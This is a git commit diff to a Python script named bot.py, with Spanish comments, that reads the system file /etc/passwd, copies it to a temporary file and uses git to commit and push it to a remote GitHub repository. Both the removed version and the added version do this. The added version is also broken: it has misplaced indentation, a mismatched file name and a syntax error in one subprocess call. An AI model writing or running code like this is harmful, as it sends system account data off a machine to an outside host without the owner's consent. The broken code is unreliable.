2d07005ee24b3d051c423d6ef38c4a9d00402a49
handicap11 <158589346+handicap11@users.noreply.github.com>
2024-02-09 16:13:56 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,37 +1,23 @@
 import subprocess
 
 def run():
-    # Ruta al archivo /etc/passwd
-    ruta_passwd = '/etc/passwd'
 
-    # Mensaje de commit para el cambio
-    mensaje_commit = 'Agregar /etc/passwd a GitHub'
+    archivo = '/etc/passwd'
+    mensaje_commit = 'archivo passwd rn Github'
 
-    # Nombre del archivo en el repositorio
+with open(archivo, 'r') as file:
+    contenido = file.read()
+    repo_nombre = 'handicap11'
     archivo_en_repo = 'passwd_backup.txt'
 
-    # Lee el contenido del archivo /etc/passwd
-    with open(ruta_passwd, 'r') as file:
-        contenido = file.read()
+with open ('temp.txt', 'w') as temp_file:
+    temp_file.write(contenido)
 
-    # Guarda el contenido en un archivo temporal
-    with open('temp_passwd_backup.txt', 'w') as temp_file:
-        temp_file.write(contenido)
+subprocess.run(['git', 'add', 'temp_txt'])
+subprocess.run[('git', 'commit', '-m', mensaje_commit])
+subprocess.run(['git', 'push','origin', 'main'])
 
-    # Añade el archivo al repositorio git
-    subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
-
-    # Verifica si hay cambios para confirmar
-    status = subprocess.run(['git', 'status', '--porcelain'], stdout=subprocess.PIPE)
-    if status.stdout:
-        # Hay cambios, realiza commit y push
-        subprocess.run(['git', 'commit', '-m', mensaje_commit])
-        subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
-        print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')
-    else:
-        # No hay cambios, informa al usuario
-        print('No hay cambios para realizar commit.')
-
+print(f'Archivo {archivo} publicado en Github en este reporsitorio {repo_nombre}/{archivo_en_repo}')
 # Llamamos a la función run()
 run()
 
